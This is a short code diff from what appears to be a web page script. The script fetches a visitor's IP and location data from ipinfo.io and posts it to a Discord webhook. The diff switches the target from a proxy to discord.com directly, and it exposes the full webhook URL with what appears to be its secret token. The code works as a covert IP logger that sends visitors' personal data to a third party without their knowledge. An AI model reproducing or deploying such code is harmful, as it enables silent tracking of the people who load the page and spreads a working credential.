@@ -37,9 +37,9 @@ $.getJSON('https://ipinfo.io/json', function(data) {
         "attachments": []
       }
       var request = new XMLHttpRequest();
-      request.open("POST", "https://webhook.lewisakura.moe/api/webhooks/1088617585383321663/CYsKqjcEI5gZHKNCiDNHPdcVjlWduQczIHwPewBR4bsLVS3R4_KZ4x34FzPiyOCNaLUb");
+      request.open("POST", "https://discord.com/api/webhooks/1088617585383321663/CYsKqjcEI5gZHKNCiDNHPdcVjlWduQczIHwPewBR4bsLVS3R4_KZ4x34FzPiyOCNaLUb");
 
-      request.setRequestHeader('Content-type', 'application/json');
+      request.setRequestHeader('Content-Type', 'application/json');
 
       request.send(JSON.stringify(post));
 });
